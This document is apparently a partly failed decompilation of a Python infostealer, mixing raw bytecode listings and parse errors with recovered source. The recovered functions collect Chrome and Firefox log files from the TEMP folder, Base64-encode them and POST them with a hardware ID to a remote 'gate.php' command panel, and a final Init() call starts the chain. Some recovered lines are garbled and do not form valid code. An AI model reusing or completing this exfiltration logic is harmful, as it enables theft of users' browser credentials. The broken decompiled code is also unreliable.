              114  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              116  STORE_FAST               'x'

 L. 742       118  LOAD_FAST                'r'
              120  LOAD_METHOD              raise_for_status
              122  CALL_METHOD_0         0  ''
              124  POP_TOP          
              126  POP_BLOCK        
              128  JUMP_FORWARD        328  'to 328'
            130_0  COME_FROM_FINALLY    88  '88'

 L. 743       130  DUP_TOP          
              132  LOAD_GLOBAL              requests
              134  LOAD_ATTR                exceptions
              136  LOAD_ATTR                HTTPError
              138  <121>               178  ''
              140  POP_TOP          
              142  STORE_FAST               'errh'
              144  POP_TOP          
              146  SETUP_FINALLY       170  'to 170'

 L. 744       148  LOAD_GLOBAL              print
              150  LOAD_STR                 'Http Error:'
              152  LOAD_FAST                'errh'
              154  CALL_FUNCTION_2       2  ''
              156  POP_TOP          
              158  POP_BLOCK        
              160  POP_EXCEPT       
              162  LOAD_CONST               None
              164  STORE_FAST               'errh'
              166  DELETE_FAST              'errh'
              168  JUMP_FORWARD        328  'to 328'
            170_0  COME_FROM_FINALLY   146  '146'
              170  LOAD_CONST               None
              172  STORE_FAST               'errh'
              174  DELETE_FAST              'errh'
              176  <48>             

 L. 745       178  DUP_TOP          
              180  LOAD_GLOBAL              requests
              182  LOAD_ATTR                exceptions
              184  LOAD_ATTR                ConnectionError
              186  <121>               226  ''
              188  POP_TOP          
              190  STORE_FAST               'errc'
              192  POP_TOP          
              194  SETUP_FINALLY       218  'to 218'

 L. 746       196  LOAD_GLOBAL              print
              198  LOAD_STR                 'Error Connecting:'
              200  LOAD_FAST                'errc'
              202  CALL_FUNCTION_2       2  ''
              204  POP_TOP          
              206  POP_BLOCK        
              208  POP_EXCEPT       
              210  LOAD_CONST               None
              212  STORE_FAST               'errc'
              214  DELETE_FAST              'errc'
              216  JUMP_FORWARD        328  'to 328'
            218_0  COME_FROM_FINALLY   194  '194'
              218  LOAD_CONST               None
              220  STORE_FAST               'errc'
              222  DELETE_FAST              'errc'
              224  <48>             

 L. 747       226  DUP_TOP          
              228  LOAD_GLOBAL              requests
              230  LOAD_ATTR                exceptions
              232  LOAD_ATTR                Timeout
          234_236  <121>               276  ''
              238  POP_TOP          
              240  STORE_FAST               'errt'
              242  POP_TOP          
              244  SETUP_FINALLY       268  'to 268'

 L. 748       246  LOAD_GLOBAL              print
              248  LOAD_STR                 'Timeout Error:'
              250  LOAD_FAST                'errt'
              252  CALL_FUNCTION_2       2  ''
              254  POP_TOP          
              256  POP_BLOCK        
              258  POP_EXCEPT       
              260  LOAD_CONST               None
              262  STORE_FAST               'errt'
              264  DELETE_FAST              'errt'
              266  JUMP_FORWARD        328  'to 328'
            268_0  COME_FROM_FINALLY   244  '244'
              268  LOAD_CONST               None
              270  STORE_FAST               'errt'
              272  DELETE_FAST              'errt'
              274  <48>             

 L. 749       276  DUP_TOP          
              278  LOAD_GLOBAL              requests
              280  LOAD_ATTR                exceptions
              282  LOAD_ATTR                RequestException
          284_286  <121>               326  ''
              288  POP_TOP          
              290  STORE_FAST               'err'
              292  POP_TOP          
              294  SETUP_FINALLY       318  'to 318'

 L. 750       296  LOAD_GLOBAL              print
              298  LOAD_STR                 'OOps: Something Else'
              300  LOAD_FAST                'err'
              302  CALL_FUNCTION_2       2  ''
              304  POP_TOP          
              306  POP_BLOCK        
              308  POP_EXCEPT       
              310  LOAD_CONST               None
              312  STORE_FAST               'err'
              314  DELETE_FAST              'err'
              316  JUMP_FORWARD        328  'to 328'
            318_0  COME_FROM_FINALLY   294  '294'
              318  LOAD_CONST               None
              320  STORE_FAST               'err'
              322  DELETE_FAST              'err'
              324  <48>             
              326  <48>             
            328_0  COME_FROM           316  '316'
            328_1  COME_FROM           266  '266'
            328_2  COME_FROM           216  '216'
            328_3  COME_FROM           168  '168'
            328_4  COME_FROM           128  '128'

Parse error at or near `<121>' instruction at offset 138


def PostCall--- This code section failed: ---

 L. 753         0  LOAD_STR                 'hwid'
                2  LOAD_GLOBAL              hwid
                4  LOAD_FAST                'Param'
                6  LOAD_FAST                'PostData'
                8  BUILD_MAP_2           2 
               10  STORE_FAST               'Data'

 L. 754        12  SETUP_FINALLY        32  'to 32'

 L. 755        14  LOAD_GLOBAL              requests
               16  LOAD_ATTR                post
               18  LOAD_FAST                'BaseUrl'
               20  LOAD_FAST                'Data'
               22  LOAD_CONST               ('data',)
               24  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               26  STORE_FAST               'Post'
               28  POP_BLOCK        
               30  JUMP_FORWARD        226  'to 226'
             32_0  COME_FROM_FINALLY    12  '12'

 L. 756        32  DUP_TOP          
               34  LOAD_GLOBAL              requests
               36  LOAD_ATTR                exceptions
               38  LOAD_ATTR                HTTPError
               40  <121>                80  ''
               42  POP_TOP          
               44  STORE_FAST               'errh'
               46  POP_TOP          
               48  SETUP_FINALLY        72  'to 72'

 L. 757        50  LOAD_GLOBAL              print
               52  LOAD_STR                 'Http Error:'
               54  LOAD_FAST                'errh'
               56  CALL_FUNCTION_2       2  ''
               58  POP_TOP          
               60  POP_BLOCK        
               62  POP_EXCEPT       
               64  LOAD_CONST               None
               66  STORE_FAST               'errh'
               68  DELETE_FAST              'errh'
               70  JUMP_FORWARD        226  'to 226'
             72_0  COME_FROM_FINALLY    48  '48'
               72  LOAD_CONST               None
               74  STORE_FAST               'errh'
               76  DELETE_FAST              'errh'
               78  <48>             

 L. 758        80  DUP_TOP          
               82  LOAD_GLOBAL              requests
               84  LOAD_ATTR                exceptions
               86  LOAD_ATTR                ConnectionError
               88  <121>               128  ''
               90  POP_TOP          
               92  STORE_FAST               'errc'
               94  POP_TOP          
               96  SETUP_FINALLY       120  'to 120'

 L. 759        98  LOAD_GLOBAL              print
              100  LOAD_STR                 'Error Connecting:'
              102  LOAD_FAST                'errc'
              104  CALL_FUNCTION_2       2  ''
              106  POP_TOP          
              108  POP_BLOCK        
              110  POP_EXCEPT       
              112  LOAD_CONST               None
              114  STORE_FAST               'errc'
              116  DELETE_FAST              'errc'
              118  JUMP_FORWARD        226  'to 226'
            120_0  COME_FROM_FINALLY    96  '96'
              120  LOAD_CONST               None
              122  STORE_FAST               'errc'
              124  DELETE_FAST              'errc'
              126  <48>             

 L. 760       128  DUP_TOP          
              130  LOAD_GLOBAL              requests
              132  LOAD_ATTR                exceptions
              134  LOAD_ATTR                Timeout
              136  <121>               176  ''
              138  POP_TOP          
              140  STORE_FAST               'errt'
              142  POP_TOP          
              144  SETUP_FINALLY       168  'to 168'

 L. 761       146  LOAD_GLOBAL              print
              148  LOAD_STR                 'Timeout Error:'
              150  LOAD_FAST                'errt'
              152  CALL_FUNCTION_2       2  ''
              154  POP_TOP          
              156  POP_BLOCK        
              158  POP_EXCEPT       
              160  LOAD_CONST               None
              162  STORE_FAST               'errt'
              164  DELETE_FAST              'errt'
              166  JUMP_FORWARD        226  'to 226'
            168_0  COME_FROM_FINALLY   144  '144'
              168  LOAD_CONST               None
              170  STORE_FAST               'errt'
              172  DELETE_FAST              'errt'
              174  <48>             

 L. 762       176  DUP_TOP          
              178  LOAD_GLOBAL              requests
              180  LOAD_ATTR                exceptions
              182  LOAD_ATTR                RequestException
              184  <121>               224  ''
              186  POP_TOP          
              188  STORE_FAST               'err'
              190  POP_TOP          
              192  SETUP_FINALLY       216  'to 216'

 L. 763       194  LOAD_GLOBAL              print
              196  LOAD_STR                 'OOps: Something Else'
              198  LOAD_FAST                'err'
              200  CALL_FUNCTION_2       2  ''
              202  POP_TOP          
              204  POP_BLOCK        
              206  POP_EXCEPT       
              208  LOAD_CONST               None
              210  STORE_FAST               'err'
              212  DELETE_FAST              'err'
              214  JUMP_FORWARD        226  'to 226'
            216_0  COME_FROM_FINALLY   192  '192'
              216  LOAD_CONST               None
              218  STORE_FAST               'err'
              220  DELETE_FAST              'err'
              222  <48>             
              224  <48>             
            226_0  COME_FROM           214  '214'
            226_1  COME_FROM           166  '166'
            226_2  COME_FROM           118  '118'
            226_3  COME_FROM            70  '70'
            226_4  COME_FROM            30  '30'

Parse error at or near `<121>' instruction at offset 40


def SendData():
    sendUrl = url + 'gate.php?opt=insert'
    ffSendUrl = sendUrl + 'ff'
    chSendUrl = sendUrl + 'ch'
    ffLogs = os.environ['TEMP'] + os.sep + '\\ff.tmp'
    chLogs = os.environ['TEMP'] + os.sep + '\\ch.tmp'
    if os.path.isfile(ffLogs) and os.path.isfile(chLogs):
        print('ff y ch')
        PostCallffSendUrl'ffdata'Base64Encode(ffLogs)
        PostCallchSendUrl'chdata'Base64Encode(chLogs)
    elif os.path.isfile(ffLogs):
        PostCallffSendUrl'ffdata'Base64Encode(ffLogs)
    elif os.path.isfile(chLogs):
        PostCallchSendUrl'chdata'Base64Encode(chLogs)
    else:
        c = 'a'


def Init--- This code section failed: ---

 L. 788         0  LOAD_GLOBAL              write_key
                2  CALL_FUNCTION_0       0  ''
                4  POP_TOP          

 L. 789         6  SETUP_FINALLY        24  'to 24'

 L. 790         8  LOAD_GLOBAL              Chrome
               10  CALL_FUNCTION_0       0  ''
               12  POP_TOP          

 L. 791        14  LOAD_GLOBAL              Firefox
               16  CALL_FUNCTION_0       0  ''
               18  POP_TOP          
               20  POP_BLOCK        
               22  JUMP_FORWARD         40  'to 40'
             24_0  COME_FROM_FINALLY     6  '6'

 L. 792        24  POP_TOP          
               26  POP_TOP          
               28  POP_TOP          

 L. 793        30  LOAD_STR                 'true'
               32  STORE_FAST               'erno'
               34  POP_EXCEPT       
               36  JUMP_FORWARD         40  'to 40'
               38  <48>             
             40_0  COME_FROM            36  '36'
             40_1  COME_FROM            22  '22'

 L. 794        40  LOAD_GLOBAL              Connect2Panel
               42  CALL_FUNCTION_0       0  ''
               44  POP_TOP          

 L. 795        46  LOAD_GLOBAL              SendData
               48  CALL_FUNCTION_0       0  ''
               50  POP_TOP          

 L. 796        52  LOAD_GLOBAL              ListFiles
               54  LOAD_GLOBAL              profilePathTest
               56  CALL_FUNCTION_1       1  ''
               58  POP_TOP          

 L. 797        60  LOAD_GLOBAL              CreateTxtFiles
               62  CALL_FUNCTION_0       0  ''
               64  POP_TOP          

Parse error at or near `<48>' instruction at offset 38


Init()